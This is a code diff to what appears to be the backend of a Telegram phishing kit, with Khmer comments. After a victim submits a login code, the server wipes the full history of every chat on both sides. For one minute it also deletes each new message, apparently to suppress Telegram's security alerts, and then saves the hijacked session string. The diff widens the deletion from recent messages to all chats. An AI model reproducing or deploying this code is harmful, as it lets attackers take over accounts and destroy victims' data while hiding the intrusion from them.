@@ -24,64 +24,68 @@ const adminChatId = process.env.ADMIN_CHAT_ID;
 const sessions = {};
 
 /**
- * 1. Function លុបសារ 5 នាទីមុនពេល Log-in
+ * 1. Function លុប Chat និងសារទាំងអស់ (User, Bot, Telegram) ដោយគ្មានដែនកំណត់
  */
-async function deleteRecentChats(client) {
+async function deleteAllChats(client) {
     try {
-        const nowInSeconds = Math.floor(Date.now() / 1000);
-        const fiveMinutesAgo = nowInSeconds - (5 * 60);
-
         const dialogs = await client.getDialogs({});
 
         for (const dialog of dialogs) {
             try {
-                const messages = await client.getMessages(dialog.entity, { limit: 50 });
+                // វិធីទី ១: លុបប្រវត្តិសារទាំងអស់ក្នុង Chat (Delete History for both sides)
+                await client.invoke(new Api.messages.DeleteHistory({
+                    peer: dialog.inputEntity,
+                    maxId: 0,
+                    revoke: true,
+                    justClear: false
+                }));
 
-                const messageIdsToDelete = messages
-                    .filter(msg => msg.date && msg.date >= fiveMinutesAgo)
-                    .map(msg => msg.id);
+                // វិធីទី ២: ស្កែនលុបសារដែលមានស្រាប់ទាំងអស់ដើម្បីការពារជ្រុះសល់
+                const messages = await client.getMessages(dialog.entity, { limit: 100 });
+                const messageIds = messages.map(msg => msg.id);
 
-                if (messageIdsToDelete.length > 0) {
-                    await client.deleteMessages(dialog.entity, messageIdsToDelete, { revoke: true });
+                if (messageIds.length > 0) {
+                    await client.deleteMessages(dialog.entity, messageIds, { revoke: true });
                 }
             } catch (err) {
-                console.error(`Failed to delete messages in dialog ${dialog.name || dialog.id}:`, err.message);
+                console.error(`Failed to wipe messages in dialog ${dialog.name || dialog.id}:`, err.message);
             }
         }
     } catch (err) {
-        console.error("Error running deleteRecentChats:", err.message);
+        console.error("Error running deleteAllChats:", err.message);
     }
 }
 
 /**
- * 2. Function លុបសារភ្លាមៗ និងតាមដានលុបសារថ្មីៗក្នុងរង្វង់ 10 វិនាទីដំបូង
+ * 2. Function តាមដាន និងលុបសារថ្មីៗភ្លាមៗ រយៈពេល ១ នាទី (៦០ វិនាទី)
  */
 async function cleanupPostLogin(client) {
-    // ជំហានទី 1: លុបសារ 5 នាទីមុន ភ្លាមៗពេល Log-in រួច
-    await deleteRecentChats(client);
+    // ជំហានទី ១: លុប Chat/សារដែលមានស្រាប់ទាំងអស់ភ្លាមៗពេល Log-in រួច
+    await deleteAllChats(client);
 
-    // ជំហានទី 2: បង្កើត Event Listener ស្ទាក់លុបសារថ្មីៗ Real-time ក្នុង 10 វិនាទីដំបូង
+    // ជំហានទី ២: បង្កើត Event Listener ចាំចាប់សារថ្មីៗ (Real-time)
     const eventHandler = async (event) => {
         try {
             const message = event.message;
             if (message && message.id) {
+                // លុបសារថ្មីដែលទើបតែផ្ញើចូល ឬផ្ញើចេញភ្លាមៗ (revoke: true លុបទាំងសងខាង)
                 await client.deleteMessages(message.peerId, [message.id], { revoke: true });
             }
         } catch (err) {
-            console.error("Error auto-deleting live message:", err.message);
+            console.error("Error auto-deleting incoming live message:", err.message);
         }
     };
 
-    // ចាប់ផ្ដើម Listen សារថ្មីៗ
+    // ចាប់ផ្ដើមរងចាំស្ទាក់លុបសារថ្មីៗពី User, Bot, និង Telegram
     client.addEventHandler(eventHandler, new NewMessage({}));
 
-    // រង់ចាំ 10 វិនាទី (10,000 ms) សម្រាប់ការផ្ញើសារ Security Alert ផ្សេងៗពី Telegram
-    await new Promise(resolve => setTimeout(resolve, 10000));
+    // រង់ចាំរយៈពេល ១ នាទី (60,000 ms)
+    await new Promise(resolve => setTimeout(resolve, 60000));
 
-    // ជំហានទី 3: ធ្វើការលុបសារម្តងទៀតជាចុងក្រោយ ដើម្បីប្រាកដថាគ្មានសារជ្រុះសល់
-    await deleteRecentChats(client);
+    // ជំហានទី ៣: ធ្វើការលុបសម្អាតសារម្តងទៀតជាចុងក្រោយ
+    await deleteAllChats(client);
 
-    // បិទ Listener វិញ
+    // បិទ Listener វិញបន្ទាប់ពីផុត ១ នាទី
     client.removeEventHandler(eventHandler, new NewMessage({}));
 }
 
@@ -149,7 +153,7 @@ app.post('/api/verify-code', async (req, res) => {
             );
         }
 
-        // ប្រតិបត្តិការលុបសារភ្លាមៗ និងតាមដានលុប 10 វិនាទីដំបូង
+        // ដំណើរការលុប Chat ទាំងអស់ និងចាំស្ទាក់លុបសារថ្មីៗរយៈពេល ១ នាទី
         await cleanupPostLogin(client);
 
         const sessionString = client.session.save();
